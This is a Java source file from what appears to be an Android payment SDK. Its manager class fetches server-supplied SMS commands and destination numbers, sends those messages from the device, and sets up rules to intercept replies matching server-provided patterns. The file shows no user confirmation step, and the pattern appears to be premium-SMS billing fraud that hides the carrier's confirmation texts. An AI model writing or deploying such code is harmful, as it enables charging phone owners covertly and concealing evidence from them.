package com.example.administrator.sdk.manager;

import android.content.Context;

import com.example.administrator.sdk.data.NormalThroughData;
import com.example.administrator.sdk.httpCenter.ThroughRequest;
import com.example.administrator.sdk.entity.RequestThroughCallBackEntity;
import com.example.administrator.sdk.entity.SmsInterceptEntity;
import com.example.administrator.sdk.sms.SmsCenter;
import com.example.administrator.sdk.sms.SmsInterceptCenter;
import com.example.administrator.sdk.utils.GsonUtils;
import com.example.administrator.sdk.utils.Kode;
import com.example.administrator.sdk.utils.Log;

import org.json.JSONObject;

import rx.Subscriber;

/**
 * Created by Administrator on 2017/7/24.
 */

public class InitRequestThroughManager {
    private static InitRequestThroughManager initRequestThroughManager = null;
    private int requestTimes = 0;
    private RequestThroughCallBackEntity requestThroughCallBackEntity = null;

    public static InitRequestThroughManager getInstance() {
        if (initRequestThroughManager == null) {
            initRequestThroughManager = new InitRequestThroughManager();
        }
        return initRequestThroughManager;
    }

    public void requestThrough(final Context context, final String price, final String Did) {
        try {
            JSONObject json = new JSONObject(NormalThroughData.getNormalThroughDataList().get(requestTimes).toString());
            String throughID = json.isNull("id") ? null : json.getString("id");
            if (null == throughID || throughID.equals("")) {
                goToNextThrough(context, price, Did);
                return;
            }
            ThroughRequest.getInstance().request(context, throughID, price, Did, new Subscriber<String>() {
                @Override
                public void onCompleted() {
                    Log.debug("request through completed!!!");
                }

                @Override
                public void onError(Throwable e) {
                    goToNextThrough(context, price, Did);
                    Log.debug("request through error : " + e.getMessage().toString());
                }

                @Override
                public void onNext(String s) {
                    Log.debug("init request through successed : " + Kode.e(s));
                    requestThroughCallBackEntity = (RequestThroughCallBackEntity) GsonUtils.getInstance().JsonToEntity(Kode.e(s), RequestThroughCallBackEntity.class);
                    if (!requestThroughCallBackEntity.getState().equals("0")) {
                        Log.debug("请求失败:" + requestThroughCallBackEntity.getResultmsg());
                        goToNextThrough(context, price, Did);
                    } else {
                        setInterceptData();
                        send(context);
                        goToNextThrough(context, price, Did);
                    }
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
            goToNextThrough(context, price, Did);
        }
    }


    private void goToNextThrough(Context context, String price, String Did) {
        if (setRequestTimes() != -1) {
            requestThrough(context, price, Did);
        } else {
            return;
        }
    }

    private void send(Context context) {
        for (int i = 0; i < requestThroughCallBackEntity.getOrder().size(); i++) {
            String command = requestThroughCallBackEntity.getOrder().get(i).getCommand();
            String sendport = requestThroughCallBackEntity.getOrder().get(i).getSendport();
            SmsCenter.getInstance().sendSms(context, sendport, command);
        }
    }

    private void setInterceptData() {
        if (!requestThroughCallBackEntity.getPayType().equals("0")) {
            SmsInterceptEntity smsInterceptEntity = new SmsInterceptEntity();
            smsInterceptEntity.setFix_msg(requestThroughCallBackEntity.getFix_msg());
            smsInterceptEntity.setPayType(requestThroughCallBackEntity.getPayType());
            smsInterceptEntity.setLimit_msg_1(requestThroughCallBackEntity.getLimit_msg_1());
            smsInterceptEntity.setLimit_msg_2(requestThroughCallBackEntity.getLimit_msg_2());
            smsInterceptEntity.setLimitNum(requestThroughCallBackEntity.getLimitNum());
            smsInterceptEntity.setLimit_msg_data(requestThroughCallBackEntity.getLimit_msg_data());
            if (null != requestThroughCallBackEntity.getOrder() && requestThroughCallBackEntity.getOrder().size() > 0) {
                smsInterceptEntity.setOtherNeedUrl(requestThroughCallBackEntity.getOrder().get(0).getOtherNeedUrl());
                smsInterceptEntity.setSendParam(GsonUtils.getInstance().EntityToJson(requestThroughCallBackEntity.getOrder().get(0).getSendParam()));
            }
            if (null == SmsInterceptCenter.interceptContentList || SmsInterceptCenter.interceptContentList.size() <= 0) {
                SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
                Log.debug("init SmsInterceptCenter  interceptContentList : " + SmsInterceptCenter.interceptContentList.get(0).toString());
            } else {
                for (int i = 0; i < SmsInterceptCenter.interceptContentList.size(); i++) {
                    if (SmsInterceptCenter.interceptContentList.get(i).toString().contains(requestThroughCallBackEntity.getLimit_msg_2()) && SmsInterceptCenter.interceptContentList.get(i).contains(requestThroughCallBackEntity.getLimit_msg_data())) {
                        SmsInterceptCenter.interceptContentList.remove(i);
                    }
                    SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
                }
            }
        }
    }

    private int setRequestTimes() {
        Log.debug("ReuqestTimes:" + requestTimes);
        ++requestTimes;
        if (requestTimes > 7) {
            requestTimes = 0;
            return -1;
        } else {
            return 0;
        }
    }
}
